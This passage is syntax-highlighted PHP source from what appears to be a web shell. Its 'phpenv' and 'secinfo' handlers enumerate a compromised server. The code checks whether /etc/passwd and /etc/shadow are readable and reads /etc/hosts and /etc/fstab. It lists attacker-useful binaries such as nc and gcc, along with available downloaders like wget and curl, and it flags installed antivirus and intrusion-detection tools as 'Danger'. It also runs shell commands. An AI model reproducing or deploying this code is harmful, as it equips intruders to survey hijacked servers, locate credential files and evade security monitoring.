<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">5</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server OS Charset'</span>,$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">6</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server Software'</span>,$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_SOFTWARE'</span>]),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">7</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server Web Port'</span>,$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_PORT'</span>]),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">8</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'PHP run mode'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">9</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'The file path'</span>,<span style="color: #4271ae;">__FILE__</span>),

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">10</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'PHP Version'</span>,<span style="color: #4271ae;">PHP_VERSION</span>),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">11</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'PHPINFO'</span>,(<span style="color: #c82829; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #3e999f;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #3e999f; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">12</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Safe Mode'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'safe_mode'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">13</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Administrator'</span>,$<span style="color: #eab700;">adminmail</span>),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">14</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'allow_url_fopen'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'allow_url_fopen'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">15</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'enable_dl'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'enable_dl'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">16</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'display_errors'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'display_errors'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">17</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'register_globals'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'register_globals'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">18</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'magic_quotes_gpc'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'magic_quotes_gpc'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">19</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'memory_limit'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'memory_limit'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">20</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'post_max_size'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'post_max_size'</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">21</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'upload_max_filesize'</span>,$<span style="color: #eab700;">upsize</span>),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">22</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'max_execution_time'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'max_execution_time'</span>).<span style="color: #3e999f;">' second(s</span><span style="color: #3e999f; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">23</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'disable_functions'</span>,$<span style="color: #eab700;">dis_func</span>),
<span style="background-color: #d6d6d6;"> </span>   );

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">phpvarname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span>$<span style="color: #eab700;">phpvarname</span> .<span style="color: #3e999f;">' : '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span>$<span style="color: #eab700;">phpvarname</span>));
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Server environment'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'phpenv'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #3e999f; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfooter(</span>);

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">hp</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(0</span>=&gt; <span style="color: #3e999f;">'Server'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">1</span>=&gt; <span style="color: #3e999f;">'PHP'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">a</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;$<span style="color: #eab700;">a</span>&lt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>;$<span style="color: #eab700;">a</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;'</span>.$<span style="color: #eab700;">hp</span>[$<span style="color: #eab700;">a</span>].<span style="color: #3e999f;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">a</span>==<span style="color: #4d4d4c; background-color: #ffffff;">0</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">1</span>;$<span style="color: #eab700;">i</span>&lt;=<span style="color: #4d4d4c; background-color: #ffffff;">9</span>;$<span style="color: #eab700;">i</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #eab700;">info</span>[$<span style="color: #eab700;">i</span>][<span style="color: #4d4d4c; background-color: #ffffff;">0</span>].<span style="color: #3e999f;">':&lt;/u&gt;'</span>.$<span style="color: #eab700;">info</span>[$<span style="color: #eab700;">i</span>][<span style="color: #4d4d4c; background-color: #ffffff;">1</span>].<span style="color: #3e999f;">'&lt;/li&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">a</span> == <span style="color: #4d4d4c; background-color: #ffffff;">1</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>($<span style="color: #eab700;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">10</span>;$<span style="color: #eab700;">i</span>&lt;=<span style="color: #4d4d4c; background-color: #ffffff;">23</span>;$<span style="color: #eab700;">i</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #eab700;">info</span>[$<span style="color: #eab700;">i</span>][<span style="color: #4d4d4c; background-color: #ffffff;">0</span>].<span style="color: #3e999f;">':&lt;/u&gt;'</span>.$<span style="color: #eab700;">info</span>[$<span style="color: #eab700;">i</span>][<span style="color: #4d4d4c; background-color: #ffffff;">1</span>].<span style="color: #3e999f;">'&lt;/li&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/ul&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end phpenv</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'secinfo'</span>) {

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Server software'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">getenv(</span><span style="color: #3e999f;">'SERVER_SOFTWARE'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Disabled PHP Functions'</span>, ($<span style="color: #4271ae;">GLOBALS</span>[<span style="color: #3e999f;">'disable_functions'</span>])?$<span style="color: #4271ae;">GLOBALS</span>[<span style="color: #3e999f; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #3e999f; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Open base dir'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">ini_get(</span><span style="color: #3e999f;">'open_basedir'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Safe mode exec dir'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">ini_get(</span><span style="color: #3e999f;">'safe_mode_exec_dir'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Safe mode include dir'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">ini_get(</span><span style="color: #3e999f;">'safe_mode_include_dir'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'cURL support'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'curl_version'</span>)?<span style="color: #3e999f;">'enabled'</span>:<span style="color: #3e999f;">'no'</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'mysql_get_client_info'</span>))
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>[] = <span style="color: #3e999f;">"MySql ("</span>.<span style="color: #4d4d4c; background-color: #ffffff;">mysql_get_client_info(</span>).<span style="color: #3e999f;">")"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'mssql_connect'</span>))
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>[] = <span style="color: #3e999f;">"MSSQL"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'pg_connect'</span>))
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>[] = <span style="color: #3e999f;">"PostgreSQL"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'oci_connect'</span>))
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>[] = <span style="color: #3e999f;">"Oracle"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Supported databases'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">', '</span>, $<span style="color: #eab700;">temp</span>));

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>( !<span style="color: #c82829; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">userful</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'gcc'</span>,<span style="color: #3e999f;">'lcc'</span>,<span style="color: #3e999f;">'cc'</span>,<span style="color: #3e999f;">'ld'</span>,<span style="color: #3e999f;">'make'</span>,<span style="color: #3e999f;">'php'</span>,<span style="color: #3e999f;">'perl'</span>,<span style="color: #3e999f;">'python'</span>,<span style="color: #3e999f;">'rub</span><span style="color: #3e999f; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">danger</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'kav'</span>,<span style="color: #3e999f;">'nod32'</span>,<span style="color: #3e999f;">'bdcored'</span>,<span style="color: #3e999f;">'uvscan'</span>,<span style="color: #3e999f;">'sav'</span>,<span style="color: #3e999f;">'drwebd'</span>,<span style="color: #3e999f;">'clamd'</span>,<span style="color: #3e999f; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">downloaders</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'wget'</span>,<span style="color: #3e999f;">'fetch'</span>,<span style="color: #3e999f;">'lynx'</span>,<span style="color: #3e999f;">'links'</span>,<span style="color: #3e999f;">'curl'</span>,<span style="color: #3e999f;">'get'</span>,<span style="color: #3e999f;">'lwp-mir</span><span style="color: #3e999f; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Readable /etc/passwd'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">is_readable(</span><span style="color: #3e999f;">'/etc/passwd'</span>) ? <span style="color: #3e999f;">"yes"</span> : <span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Readable /etc/shadow'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">is_readable(</span><span style="color: #3e999f;">'/etc/shadow'</span>) ? <span style="color: #3e999f;">"yes"</span> : <span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'OS version'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span><span style="color: #3e999f;">'/proc/version'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Distr name'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span><span style="color: #3e999f;">'/etc/issue.net'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">safe_mode</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">ini_get(</span><span style="color: #3e999f;">'safe_mode'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #4271ae;">GLOBALS</span>[<span style="color: #3e999f;">'safe_mode'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">userful</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">item</span>)
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">which(</span>$<span style="color: #eab700;">item</span>)){$<span style="color: #eab700;">temp</span>[]=$<span style="color: #eab700;">item</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Userful'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">', '</span>,$<span style="color: #eab700;">temp</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">danger</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">item</span>)
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">which(</span>$<span style="color: #eab700;">item</span>)){$<span style="color: #eab700;">temp</span>[]=$<span style="color: #eab700;">item</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Danger'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">', '</span>,$<span style="color: #eab700;">temp</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">temp</span>=<span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">downloaders</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">item</span>)<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">which(</span>$<span style="color: #eab700;">item</span>)){$<span style="color: #eab700;">temp</span>[]=$<span style="color: #eab700;">item</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Downloaders'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">', '</span>,$<span style="color: #eab700;">temp</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Hosts'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span><span style="color: #3e999f;">'/etc/hosts'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'HDD space'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'df -h'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'Mount options'</span>, @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span><span style="color: #3e999f;">'/etc/fstab'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">secparam(</span><span style="color: #3e999f;">'OS Version'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">'ver'</span>));
